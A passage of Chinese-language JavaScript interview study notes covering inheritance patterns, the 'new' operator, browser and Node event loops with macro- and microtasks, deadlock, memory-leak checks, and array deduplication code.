    Parent.call(this, name, id);
    // Parent.apply(this, arguments);
}

var child=new Child("kop",26);
child.printName();  //kop
child.sayName();  //TypeError: child.sayName is not a function

```

**原理**：使用call或者apply**更改子类函数的作用域**，使this执行父类构造函数，子类因此可以继承父类共有属性

**优点**：可解决原型链继承的缺点

**缺点**：不可继承父类的原型链方法，构造函数不可复用



(3) 组合继承

**原理**：综合使用构造函数继承和原型链继承

```js
function Parent(name,id){
    this.id=id;
    this.name=name;
    this.list=["a"];
    this.printName=function(){
        console.log(this.name);
    }
}
Parent.prototype.sayName=function(){
    console.log(this.name);
}

function Child(name,id){
    Parent.call(this,name,id);
    // Parent.apply(this, arguments);
}
Child.prototype=new Parent();

var child=new Child("kop",26);
child.printName();  //kop
child.sayName();  //kop

var a=new Child();
var b=new Child();
a.list.push("b");
console.log(a.list);  //[ 'a', 'b' ]
console.log(b.list);  //[ 'a' ]
```

**优点**：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的

**缺点**：会执行两次父类的构造函数，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数



(4) 原型式继承

**原理**：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的`__proto__`指向父对象

```js
var parent = {
  names: ['a']
}
function copy(object) {
  function F() {}
  F.prototype = object;    
  return new F();
}

var child1 = copy(parent);
var child2 = copy(parent);

child1.names.push("b");

console.log(child2.names);  // [ 'a', 'b' ]
```

缺点：共享引用类型



(5) 寄生式继承

原理：二次封装原型式继承，并拓展

```js
var parent = {
  names: ['a']
}
function copy(object) {
  function F() {}
  F.prototype = object;    
  return new F();
}

function createObject(obj) {
  var o = copy(obj);

  o.getNames = function() {
    return this.names;
  }
  return o;
}

var child1 = createObject(parent);
var child2 = createObject(parent);

child1.names.push("b");

console.log(child2.names);  // [ 'a', 'b' ]
console.log(child1.getNames());  // [ 'a', 'b' ]
```

优点：可添加新的属性和方法

缺点：共享引用类型



(6) 寄生组合式继承

原理：改进组合继承，利用寄生式继承的思想继承原型

```js

function copy(object) {
  function F() {}
  F.prototype = object;    
  return new F();
}

function inheritPrototype(subClass, superClass) {
  // 复制一份父类的原型
  var p = copy(superClass.prototype);
  // 修正构造函数
  p.constructor = subClass;
  // 设置子类原型
  subClass.prototype = p;
}

function Parent(id, name){
  this.id = id;
  this.name = name;
  this.list = ['a'];
  this.printName = function(){
    console.log(this.name);
  }
}
Parent.prototype.sayName = function(){
  console.log(this.name);
};
function Child(id, name){
  Parent.call(this, id, name);
  // Parent.apply(this, arguments);
}
inheritPrototype(Child, Parent);

var child1 = new Child(1, "kop");
var child2 = new Child(2, "bob");

child1.list.push("b");

console.log(child1.list);  // [ 'a', 'b' ]
console.log(child2.list);  // [ 'a' ]
child1.sayName();  // kop
child2.sayName();  // bob
```





------

## 7. new会发生什么

1. 创建空对象；
   var obj = {};

2. 设置新对象的constructor属性为构造函数的名称，设置新对象的**proto**属性指向构造函数的prototype对象；
   obj.`__proto__ `= ClassA.prototype;
   扩展了新对象的原型链。

3. 使用新对象调用函数，函数中的this被指向新实例对象：
   ClassA.call(obj);　　//{}.构造函数();

4. 返回this指针。当存在显示的返回时，返回return后面的内容。新建的空对象作废。

   ```js
   function test() {
    	this.name = "test";
    }
    test.prototype = {
    	a:{},
    	b:{}
    }
   
   var  c = new test();
   ```

**`new`** 关键字会进行如下的操作：

1. 创建一个空的简单JavaScript对象（即`{}`）；
2. 为步骤1新创建的对象添加属性`__proto__`，将该属性链接至构造函数的原型对象 ；
3. 将步骤1新创建的对象作为`this`的上下文 ；
4. 如果该函数没有返回对象，则返回`this`。

（译注：关于对象的 `constructor`，参见 `Object.prototype.constructor`）

创建一个用户自定义的对象需要两步：

1. 通过编写函数来定义对象类型。
2. 通过 `new` 来创建对象实例。

创建一个对象类型，需要创建一个指定其名称和属性的函数；对象的属性可以指向其他对象



------

------

#  js工作原理

------

## 1. 为什么js是单线程

这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；**这决定了它只能是单线程**，否则会带来很复杂的同步问题。 

举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变。

**扩展：**

什么是进程？

进程：是cpu分配资源的最小单位；（是能拥有资源和独立运行的最小单位）

什么是线程？

线程：是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）

浏览器是多进程的？

放在浏览器中，每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，**浏览器是一个多进程的。**

为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，**但是子线程完全受主线程控制，且不得操作DOM**。所以，这个新标准并没有改变JavaScript单线程的本质。



-------

## 2. 宏、微任务队列及执行顺序

JS 中用来存储待执行回调函数的队列包含 2 个不同特定的列队

- **宏任务列队**：用来保存待执行的宏任务（回调），比如：定时器回调、DOM 事件回调、ajax 回调
- **微任务列队**：用来保存待执行的微任务（回调），比如：promise的回调、MutationObserver 的回调

JS 执行时会区别这 2 个队列

- JS 引擎首先必须先执行所有的初始化同步任务代码
- 每次准备取出第一个宏任务执行前, 都要将所有的微任务一个一个取出来执行，**也就是优先级比宏任务高**，且与微任务所处的代码位置无关

下面这个例子可以看出**Promise要先于setTimeout执行**：

```js
setTimeout(() => { //立即放入宏队列
  console.log('timeout callback1（）')
  Promise.resolve(3).then(
    value => { //立即放入微队列
      console.log('Promise onResolved3()', value)
    }
  )
}, 0)

setTimeout(() => { //立即放入宏队列
  console.log('timeout callback2（）')
}, 0)

Promise.resolve(1).then(
  value => { //立即放入微队列
    console.log('Promise onResolved1()', value)
    setTimeout(() => {
      console.log('timeout callback3（）', value)
    }, 0)
  }
)

Promise.resolve(2).then(
  value => { //立即放入微队列
    console.log('Promise onResolved2()', value)
  }
)

// Promise onResolved1() 1
// Promise onResolved2() 2
// timeout callback1（）
// Promise onResolved3() 3
// timeout callback2（）
// timeout callback3（） 1
```





------

## 3. 死锁

死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行

产生原因

- 竞争资源引起进程死锁
- 可剥夺和非剥夺资源
- 竞争非剥夺资源
- 竞争临时性资源
- 进程推进顺序不当

产生条件

1. 互斥条件：涉及的资源是**非共享**的
   - 涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放
2. 不剥夺条件：**不能强行剥夺进程拥有的资源**
   - 进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放
3. 请求和保持条件：**进程在等待一新资源时继续占有已分配的资源**
   - 指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放 
4. 环路等待条件：**存在一种进程的循环链**，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链

解决办法

只要打破四个必要条件之一就能有效预防死锁的发生



------

## 4. 面向对象的三个特征，分别说一下什么意思

概念：

**封装：**将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。” 对象可以看作是一个自我包含的原子。对象接口包括了公共的方法和初始化数据。

**继承：** 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。

**多态：** 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：多态是指通过指向父类的引用，来调用在不同子类中实现的方法。

特点：

**封装**可以隐藏实现细节，使得代码模块化；

**继承**可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。

**多态**就是相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态





---

## 5.  js事件循环

浏览器中 JavaScript 的执行流程和 Node.js 中的流程都是基于 **事件循环** 的。

理解事件循环的工作方式对于代码优化很重要，有时对于正确的架构也很重要。

**事件循环**

**事件循环** 的概念非常简单。它是一个在 JavaScript 引擎等待任务，执行任务和进入休眠状态等待更多任务这几个状态之间转换的无限循环。

引擎的一般算法：

1. 当有任务时：
   - 从最先进入的任务开始执行。
2. 休眠直到出现任务，然后转到第 1 步。

当我们浏览一个网页时就是上述这种形式。JavaScript 引擎大多数时候不执行任何操作，它仅在脚本/处理程序/事件激活时执行。

任务示例：

- 当外部脚本 `<script src="...">` 加载完成时，任务就是执行它。
- 当用户移动鼠标时，任务就是派生出 `mousemove` 事件和执行处理程序。
- 当安排的（scheduled）`setTimeout` 时间到达时，任务就是执行其回调。
- ……诸如此类。

设置任务 —— 引擎处理它们 —— 然后等待更多任务（即休眠，几乎不消耗 CPU 资源）。

一个任务到来时，引擎可能正处于繁忙状态，那么这个任务就会被排入队列。

多个任务组成了一个队列，即所谓的“宏任务队列”（v8 术语）：

![事件循环1](E:\pogject\学习笔记\image\js\事件循环1.png)

例如，当引擎正在忙于执行一段 `script` 时，用户可能会移动鼠标而产生 `mousemove` 事件，`setTimeout` 或许也刚好到期，以及其他任务，这些任务组成了一个队列，如上图所示。

队列中的任务基于“先进先出”的原则执行。当浏览器引擎执行完 `script` 后，它会处理 `mousemove` 事件，然后处理 `setTimeout` 处理程序，依此类推。

到目前为止，很简单，对吧？

两个细节：

1. **引擎执行任务时永远不会进行渲染（**render）。如果任务执行需要很长一段时间也没关系。仅在任务完成后才会绘制对 DOM 的更改。
2. **如果一项任务执行花费的时间过长，浏览器将无法执行其他任务，例如处理用户事件**。因此，在一定时间后，浏览器会抛出一个如“页面未响应”之类的警报，建议你终止这个任务。**这种情况常发生在有大量复杂的计算或导致死循环的程序错误时**。

**拆分 CPU 过载任务**

假设我们有一个 CPU 过载任务。

例如，语法高亮（用来给本页面中的示例代码着色）是相当耗费 CPU 资源的任务。为了高亮显示代码，它执行分析，创建很多着了色的元素，然后将它们添加到文档中 —— 对于文本量大的文档来说，需要耗费很长时间。

当引擎忙于语法高亮时，它就无法处理其他 DOM 相关的工作，例如处理用户事件等。它甚至可能会导致浏览器“中断（hiccup）”甚至“挂起（hang）”一段时间，这是不可接受的。

**我们可以通过将大任务拆分成多个小任务来避免这个问题。高亮显示前 100 行，然后使用 `setTimeout`（延时参数为 0）来安排（schedule）后 100 行的高亮显示，依此类推。**

为了演示这种方法，简单起见，让我们写一个从 `1` 数到 `1000000000` 的函数，而不写文本高亮。

如果你运行下面这段代码，你会看到引擎会“挂起”一段时间。对于服务端 JS 来说这显而易见，并且如果你在浏览器中运行它，尝试点击页面上其他按钮时，你会发现在计数结束之前不会处理其他事件。

```js
let i = 0;
let start = Date.now();

function count() {
  // 做一个繁重的任务
  for (let j = 0; j < 1e9; j++) {
    i++;
  }
  alert("Done in " + (Date.now() - start) + 'ms');
}

count();
```

浏览器甚至可能会显示一个“脚本执行时间过长”的警告。

让我们使用嵌套的 `setTimeout` 调用来拆分这个任务：

```js
let i = 0;

let start = Date.now();

function count() {
  // 做繁重的任务的一部分 (*)
  do {
    i++;
  } while (i % 1e6 != 0);

  if (i == 1e9) {
    alert("Done in " + (Date.now() - start) + 'ms');
  } else {
    setTimeout(count); // 安排（schedule）新的调用 (**)
  }
}

count();
```

现在，浏览器界面在“计数”过程中可以正常使用。

单次执行 `count` 会完成工作 `(*)` 的一部分，然后根据需要重新安排（schedule）自身的执行 `(**)`：

1. 首先执行计数：`i=1...1000000`。
2. 然后执行计数：`i=1000001..2000000`。
3. ……以此类推。

现在，如果在引擎忙于执行第一部分时出现了一个新的副任务（例如 `onclick` 事件），则该任务会被排入队列，然后在第一部分执行结束时，并在下一部分开始执行前，会执行该副任务。周期性地在两次 `count` 执行期间返回事件循环，**这为 JavaScript 引擎提供了足够的“空气”来执行其他操作，以响应其他的用户行为。**

值得注意的是这两种变体 —— 是否使用了 `setTimeout` 对任务进行拆分 —— 在执行速度上是相当的。在执行计数的总耗时上没有多少差异。

为了使两者耗时更接近，让我们来做一个改进。

我们将要把调度（scheduling）移动到 `count()` 的开头：

```js
let i = 0;

let start = Date.now();

function count() {

  // 将调度（scheduling）移动到开头
  if (i < 1e9 - 1e6) {
    setTimeout(count); // 安排（schedule）新的调用
  }

  do {
    i++;
  } while (i % 1e6 != 0);

  if (i == 1e9) {
    alert("Done in " + (Date.now() - start) + 'ms');
  }

}

count();
```

现在，当我们开始调用 `count()` 时，会看到我们需要对 `count()` 进行更多调用，我们就会在工作前立即安排（schedule）它。

如果你运行它，你很容易注意到它花费的时间明显减少了。

为什么？

这很简单：你应该还记得，多个嵌套的 `setTimeout` 调用在浏览器中的最小延迟为 4ms。即使我们设置了 `0`，但还是 `4ms`（或者更久一些）。**所以我们安排（schedule）得越早，运行速度也就越快。**

最后，我们将一个繁重的任务拆分成了几部分，现在它不会阻塞用户界面了。而且其总耗时并不会长很多。

**进度指示**

对浏览器脚本中的过载型任务进行拆分的另一个好处是，我们可以显示进度指示。

正如前面所提到的，仅在当前运行的任务完成后，才会对 DOM 中的更改进行绘制，无论这个任务运行花费了多长时间。

从一方面讲，这非常好，因为我们的函数可能会创建很多元素，将它们一个接一个地插入到文档中，并更改其样式 —— 访问者不会看到任何未完成的“中间态”内容。很重要，对吧？

这是一个示例，对 `i` 的更改在该函数完成前不会显示出来，所以我们将只会看到最后的值：

```html
<div id="progress"></div>

<script>
  function count() {
    for (let i = 0; i < 1e6; i++) {
      i++;
      progress.innerHTML = i;
    }
  }

  count();
</script>
```

……但是我们也可能想在任务执行期间展示一些东西，例如进度条。

如果我们使用 `setTimeout` 将繁重的任务拆分成几部分，那么变化就会被在它们之间绘制出来。

这看起来更好看

```html
<div id="progress"></div>

<script>
  let i = 0;

  function count() {

    // 做繁重的任务的一部分 (*)
    do {
      i++;
      progress.innerHTML = i;
    } while (i % 1e3 != 0);

    if (i < 1e7) {
      setTimeout(count);
    }

  }

  count();
</script>
```

现在 `div` 显示了 `i` 的值的增长，这就是进度条的一种。

**在事件之后做一些事情**

在事件处理程序中，我们可能会决定推迟某些行为，直到事件冒泡并在所有级别上得到处理后。我们可以通过将该代码包装到零延迟的 `setTimeout` 中来做到这一点。

我们看到过这样一个例子：自定义事件 `menu-open` 被在 `setTimeout` 中分派（dispatched），所以它在 `click` 事件被处理完成之后发生。

```js
menu.onclick = function() {
  // ...

  // 创建一个具有被点击的菜单项的数据的自定义事件
  let customEvent = new CustomEvent("menu-open", {
    bubbles: true
  });

  // 异步分派（dispatch）自定义事件
  setTimeout(() => menu.dispatchEvent(customEvent));
};
```

### 宏任务和微任务

**宏任务（macrotask）** 外，还有在 [微任务（Microtask）](https://zh.javascript.info/microtask-queue) 一章中提到的 **微任务（microtask）**。

微任务仅来自于我们的代码。它们通常是由 promise 创建的：对 `.then/catch/finally` 处理程序的执行会成为微任务。微任务也被用于 `await` 的“幕后”，因为它是 promise 处理的另一种形式。

还有一个特殊的函数 `queueMicrotask(func)`，它对 `func` 进行排队，以在微任务队列中执行。

**每个宏任务之后，引擎会立即执行微任务队列中的所有任务，然后再执行其他的宏任务，或渲染，或进行其他任何操作。**

例如，看看下面这个示例：

```js
setTimeout(() => alert("timeout"));

Promise.resolve()
  .then(() => alert("promise"));

alert("code");
```

这里的执行顺序是怎样的？

1. `code` 首先显示，因为它是常规的同步调用。
2. `promise` 第二个出现，因为 `then` 会通过微任务队列，并在当前代码之后执行。
3. `timeout` 最后显示，因为它是一个宏任务。

更详细的事件循环图示如下（顺序是从上到下，即：首先是脚本，然后是微任务，渲染等）：

![事件循环2](E:\pogject\学习笔记\image\js\事件循环2.png)

**微任务会在执行任何其他事件处理，或渲染，或执行任何其他宏任务之前完成**。

这很重要，因为**它确保了微任务之间的应用程序环境基本相同**（没有鼠标坐标更改，没有新的网络数据等）。

如果我们想要异步执行（在当前代码之后）一个函数**，但是要在更改被渲染或新事件被处理之前执行，那么我们可以使用 `queueMicrotask` 来对其进行安排（schedule）。**

这是一个与前面那个例子类似的，带有“计数进度条”的示例，但是它使用了 `queueMicrotask` 而不是 `setTimeout`。你可以看到它在最后才渲染。就像写的是同步代码一样：

```html
<div id="progress"></div>

<script>
  let i = 0;

  function count() {

    // 做繁重的任务的一部分 (*)
    do {
      i++;
      progress.innerHTML = i;
    } while (i % 1e3 != 0);

    if (i < 1e6) {
      queueMicrotask(count);
    }

  }

  count();
</script>
```

**总结**

更详细的事件循环算法（尽管与 [规范](https://html.spec.whatwg.org/multipage/webappapis.html#event-loop-processing-model) 相比仍然是简化过的）：

1. 从 **宏任务** 队列（例如 “script”）中出队（dequeue）并执行最早的任务。
2. 执行所有微任务：
   - 当微任务队列非空时：
     - 出队（dequeue）并执行最早的微任务。
3. 如果有变更，则将变更渲染出来。
4. 如果宏任务队列为空，则休眠直到出现宏任务。
5. 转到步骤 1。

安排（schedule）一个新的 **宏任务**：

- 使用零延迟的 `setTimeout(f)`。

它可被用于将繁重的计算任务拆分成多个部分，以使浏览器能够对用户事件作出反应，并在任务的各部分之间显示任务进度。

此外，也被用于在事件处理程序中，将一个行为（action）安排（schedule）在事件被完全处理（冒泡完成）后。

安排一个新的 **微任务**：

- 使用 `queueMicrotask(f)`。
- promise 处理程序也会通过微任务队列。

**在微任务之间没有 UI 或网络事件的处理：它们一个立即接一个地执行。**

所以，我们可以使用 `queueMicrotask` 来在保持环境状态一致的情况下，异步地执行一个函数。



```js
console.log(1);
// 第一行立即执行，它输出 `1`。
// 到目前为止，宏任务队列和微任务队列都是空的。

setTimeout(() => console.log(2));
// `setTimeout` 将回调添加到宏任务队列。
// - 宏任务队列中的内容：
//   `console.log(2)`

Promise.resolve().then(() => console.log(3));
// 将回调添加到微任务队列。
// - 微任务队列中的内容：
//   `console.log(3)`

Promise.resolve().then(() => setTimeout(() => console.log(4)));
// 带有 `setTimeout(...4)` 的回调被附加到微任务队列。
// - 微任务队列中的内容：
//   `console.log(3); setTimeout(...4)`

Promise.resolve().then(() => console.log(5));
// 回调被添加到微任务队列
// - 微任务队列中的内容：
//   `console.log(3); setTimeout(...4); console.log(5)`

setTimeout(() => console.log(6));
// `setTimeout` 将回调添加到宏任务队列
// - 宏任务队列中的内容：
//   `console.log(2); console.log(6)`

console.log(7);
// 立即输出 7

// 1 7 3 5 2 6 4
```

1. 立即输出数字 `1` 和 `7`，因为简单的 `console.log` 调用没有使用任何队列。
2. 然后，主代码流程执行完成后，开始执行微任务队列。
   - 其中有命令行：`console.log(3); setTimeout(...4); console.log(5)`。
   - 输出数字 `3` 和 `5`，**`setTimeout(() => console.log(4))` 将 `console.log(4)` 调用添加到了宏任务队列的尾部。**
   - 现在宏任务队列中有：`console.log(2); console.log(6); console.log(4)`。
3. 当微任务队列为空后，开始执行宏任务队列。并输出 `2`、`6` 和 `4`。

**为什么要引入微任务，只有一种类型的任务不行么？**

页面渲染事件，各种IO的完成事件等随时被添加到任务队列中，一直会保持先进先出的原则执行，我们不能准确地控制这些事件被添加到任务队列中的位置。但是这个时候突然有高优先级的任务需要尽快执行，那么一种类型的任务就不合适了，所以引入了微任务队列。

不同的异步任务被分为：宏任务和微任务
宏任务：

- script(整体代码)
- setTimeout()
- setInterval()
- postMessage
- I/O
- UI交互事件

微任务:

- new Promise().then(回调)
- MutationObserver(html5 新特性)

### 运行机制

异步任务的返回结果会被放到一个任务队列中，根据异步事件的类型，这个事件实际上会被放到对应的宏任务和微任务队列中去。

在当前执行栈为空时，主线程会查看微任务队列是否有事件存在

- 存在，依次执行队列中的事件对应的回调，直到微任务队列为空，然后去宏任务队列中取出最前面的事件，把当前的回调加到当前指向栈。
- 如果不存在，那么再去宏任务队列中取出一个事件并把对应的回到加入当前执行栈；

当前执行栈执行完毕后时会立刻处理所有微任务队列中的事件，然后再去宏任务队列中取出一个事件。**同一次事件循环中，微任务永远在宏任务之前执行。**

在事件循环中，每进行一次循环操作称为 tick，每一次 tick 的任务处理模型是比较复杂的，但关键步骤如下：

- 执行一个宏任务（栈中没有就从事件队列中获取）
- 执行过程中如果遇到微任务，就将它添加到微任务的任务队列中
- 宏任务执行完毕后，立即执行当前微任务队列中的所有微任务（依次执行）
- 当前宏任务执行完毕，开始检查渲染，然后GUI线程接管渲染
- 渲染完毕后，JS线程继续接管，开始下一个宏任务（从事件队列中获取）

简单总结一下执行的顺序：
执行宏任务，然后执行该宏任务产生的微任务，若微任务在执行过程中产生了新的微任务，则继续执行微任务，微任务执行完毕后，再回到宏任务中进行下一轮循环。

![宏任务和微任务](https://segmentfault.com/img/remote/1460000022805533)

---

### 和浏览器环境有何不同

表现出的状态与浏览器大致相同。不同的是 node 中有一套自己的模型。node 中事件循环的实现依赖 libuv 引擎。Node的事件循环存在几个阶段。

如果是node10及其之前版本，microtask会在事件循环的各个阶段之间执行，也就是一个阶段执行完毕，就会去执行 microtask队列中的任务。

node版本更新到11之后，Event Loop运行原理发生了变化，一旦执行一个阶段里的一个宏任务(setTimeout,setInterval和setImmediate)就立刻执行微任务队列，跟浏览器趋于一致。下面例子中的代码是按照最新的去进行分析的。

### 事件循环模型

```javascript
┌───────────────────────┐
┌─>│        timers         │
│  └──────────┬────────────┘
│  ┌──────────┴────────────┐
│  │     I/O callbacks     │
│  └──────────┬────────────┘
│  ┌──────────┴────────────┐
│  │     idle, prepare     │
│  └──────────┬────────────┘      ┌───────────────┐
│  ┌──────────┴────────────┐      │   incoming:   │
│  │         poll          │<──connections───     │
│  └──────────┬────────────┘      │   data, etc.  │
│  ┌──────────┴────────────┐      └───────────────┘
│  │        check          │
│  └──────────┬────────────┘
│  ┌──────────┴────────────┐
└──┤    close callbacks    │
   └───────────────────────┘
```

### 事件循环各阶段详解

node中事件循环的顺序

外部输入数据 --> 轮询阶段（poll） --> 检查阶段(check) --> 关闭事件回调阶段(close callback) --> 定时器检查阶段(timer) --> I/O 事件回调阶段(I/O callbacks) --> 闲置阶段(idle, prepare) --> 轮询阶段...

这些阶段大致的功能如下：

- 定时器检测阶段(timers): 这个阶段执行定时器队列中的回调如 setTimeout() 和 setInterval()。
- I/O事件回调阶段(I/O callbacks): 这个阶段执行几乎所有的回调。但是不包括close事件，定时器和setImmediate()的回调。
- 闲置阶段(idle, prepare): 这个阶段仅在内部使用，可以不必理会
- 轮询阶段(poll): 等待新的I/O事件，node在一些特殊情况下会阻塞在这里。
- 检查阶段(check): setImmediate()的回调会在这个阶段执行。
- 关闭事件回调阶段(close callbacks): 例如socket.on('close', ...)这种close事件的回调

poll：
这个阶段是轮询时间，用于等待还未返回的 I/O 事件，比如服务器的回应、用户移动鼠标等等。
这个阶段的时间会比较长。如果没有其他异步任务要处理（比如到期的定时器），会一直停留在这个阶段，等待 I/O 请求返回结果。
check:
该阶段执行setImmediate()的回调函数。

close:
该阶段执行关闭请求的回调函数，比如socket.on('close', ...)。

timer阶段:
这个是定时器阶段，处理setTimeout()和setInterval()的回调函数。进入这个阶段后，主线程会检查一下当前时间，是否满足定时器的条件。如果满足就执行回调函数，否则就离开这个阶段。

I/O callback阶段：
除了以下的回调函数，其他都在这个阶段执行：

- setTimeout()和setInterval()的回调函数
- setImmediate()的回调函数
- 用于关闭请求的回调函数，比如socket.on('close', ...)

### 宏任务和微任务

宏任务：

- setImmediate
- setTimeout
- setInterval
- script（整体代码)
- I/O 操作等。

微任务：

- process.nextTick
- new Promise().then(回调)

### Promise.nextTick， setTimeout, setImmediate的使用场景和区别

Promise.nextTick

**process.nextTick 是一个独立于 eventLoop 的任务队列。**

在每一个 eventLoop 阶段完成后会去检查 nextTick 队列，如果里面有任务，会让这部分任务优先于微任务执行。

**是所有异步任务中最快执行的。**

setTimeout：
setTimeout()方法是定义一个回调，并且希望这个回调在我们所指定的时间间隔后第一时间去执行。

setImmediate：
setImmediate()方法**从意义上将是立刻执行的意思，但是实际上它却是在一个固定的阶段才会执行回调**，即poll阶段之后。

---

### **Web Workers**

对于不应该阻塞事件循环的耗时长的繁重计算任务，我们可以使用 Web Workers.

这是在另一个并行线程中运行代码的方式。

Web Workers 可以与主线程交换消息，但是它们具有自己的变量和事件循环。

Web Workers 没有访问 DOM 的权限，因此，它们对于同时使用多个 CPU 内核的计算非常有用。



----

##  如何检查Javascript中的内存泄漏？

### 浏览器

```
1、打开开发者工具，选择 Timeline 面板
2、在顶部的Capture字段里面勾选 Memory
3、点击左上角的录制按钮。
4、在页面上进行各种操作，模拟用户的使用情况。
5、一段时间后，点击对话框的 stop 按钮，面板上就会显示这段时间的内存占用情况。
```

如果内存占用基本平稳，接近水平，就说明不存在内存泄漏。

反之，就是内存泄漏了。

### 命令行

命令行可以使用 Node 提供的process.memoryUsage方法。

```js
console.log(process.memoryUsage());

{
  rss: 20168704,
  heapTotal: 4915200,
  heapUsed: 4129056,
  external: 284355,
  arrayBuffers: 11983
}
```

process.memoryUsage返回一个对象，包含了 Node 进程的内存占用信息。该对象包含四个字段，单位是字节

```
rss（resident set size）：所有内存占用，包括指令区和堆栈。
heapTotal："堆"占用的内存，包括用到的和没用到的。
heapUsed：用到的堆的部分。
external： V8 引擎内部的 C++ 对象占用的内存。
```

判断内存泄漏，以 `heapUsed` 字段为准。



------

----



# 手写题

## 

## 1.  请问js有哪些数组去重方法？

### (1) for循环（两次嵌套）+ 新数组

```js
let nums=[1,2,3,2,4,5,3,2];

function removeRepeatElementOfArray(arr){
	let flag=true;  //元素是否存在重复
	const result=new Array();
	for(let i=0;i<arr.length;i++){
		flag=true;
		for(let j=i+1;j<arr.length;j++){
			if (arr[i]===arr[j]) {
				//遇到重复的退出该次循环,即保留的是重复元素中最后面的一个
				flag=false;
				break;
			}
		}
		if (flag) {  //如果从该元素往后没有重复
			result.push(arr[i]);
		}
	}
	return result;
}

console.log(removeRepeatElementOfArray(nums));  // [ 1, 4, 5, 3, 2 ]
```

涉及到多次遍历，执行时间较长

```js
let nums=[1,2,3,2,4,5,3,2];

function removeRepeatElementOfArray(arr){
	if (arr.length===0){
		return arr;
	}
	let flag=true;  //元素是否存在重复
	const result=new Array();
	result.push(arr[0]);

	for(let i=1;i<arr.length;i++){
		flag=true;
		for(let j=0;j<result.length;j++){
			if (arr[i]===result[j]) {  //比较新数组中是否存在
				//存在则退出该次循环
				flag=false;
				break;
			}
		}
		if (flag) {  //不存在则加入
			result.push(arr[i]);
		}
	}
	return result;
}

console.log(removeRepeatElementOfArray(nums));  // [ 1, 2, 3, 4, 5 ]
```



### (2) for循环（两次嵌套）+ splice （ES5中最常用）

双层循环，外层循环元素，内层循环时比较值，值相同时，删除这个值

```js
let nums=[1,2,3,2,4,5,3,2];

function removeRepeatElementOfArray(arr){
    if (arr.length===0){
        return arr;
    }
    for(let i=0; i < arr.length;i++){
        for(let j=i+1;j < arr.length;j++){
            if (arr[i]===arr[j]) {
                //遇到重复的删除后一个
                arr.splice(j,1);
                j--;  //这个减一很关键
            }
        }
    }
    return arr;
}

console.log(removeRepeatElementOfArray(nums));  // [ 1, 2, 3, 4, 5 ]

var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
console.log(removeRepeatElementOfArray(arr))
//[1, "true", 15, false, undefined, NaN, NaN, "NaN", "a", {…}, {…}]     //NaN和{}没有去重，两个null直接消失了
```



### (3) for 循环（一次） + indexOf() + 新数组

对方法1进行改进，对新数组判定是否有该字符，可以调用 Array.prototype.indexOf 函数，执行时间缩减了很多

```js
let nums=[1,2,3,2,4,5,3,2];

function removeRepeatElementOfArray(arr){
    if (arr.length===0){
        return arr;
    }
    const result=new Array();
    for(let i=0;i < arr.length;i++){
        if (result.indexOf(arr[i])===-1) {
            result.push(arr[i]);
        }
    }
    return result;
}

console.log(removeRepeatElementOfArray(nums));  // [ 1, 2, 3, 4, 5 ]

var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
console.log(removeRepeatElementOfArray(arr))
   // [1, "true", true, 15, false, undefined, null, NaN, NaN, "NaN", 0, "a", {…}, {…}]  //NaN、{}没有去重
```

新建一个空的结果数组，for 循环原数组，判断结果数组是否存在当前元素，如果有相同的值则跳过，不相同则push进数组。



### (4) sort 排序后去重

利用sort()排序方法，然后根据排序后的结果进行遍历及相邻元素对比

```js
let nums=[1,2,3,2,4,5,3,2];

function removeRepeatElementOfArray(arr){
    if (arr.length===0){
        return arr;
    }
    arr=arr.sort();
    const result=new Array();
    result.push(arr[0])
    
    for(let i=1;i < arr.length;i++){
        if (arr[i]!==arr[i-1]) {
            result.push(arr[i]);
        }
    }
    return result;
}

console.log(removeRepeatElementOfArray(nums));  // [ 1, 2, 3, 4, 5 ]

var arr = [1,1,'true','true',true,true,15,15,false,false, undefined,undefined, null,null, NaN, NaN,'NaN', 0, 0, 'a', 'a',{},{}];
console.log(removeRepeatElementOfArray(arr))
// [0, 1, 15, "NaN", NaN, NaN, {…}, {…}, "a", false, null, true, "true", undefined]      //NaN、{}没有去重
```



### (5) Map哈希映射

利用 ES6 中的 Map 集合替代前面方法中的新数组，调用Map.has替代indexOf()，Map.set 替代push()，执行速度比前面的方法都要快

创建一个空Map数据结构，遍历需要去重的数组，把数组的每一个元素作为key存到Map中。由于Map中不会出现相同的key值，所以最终得到的就是去重后的结果。

```js
let nums=[1,2,3,2,4,5,3,2];

function removeRepeatElementOfArray(arr){
    if (arr.length===0){
        return arr;
    }
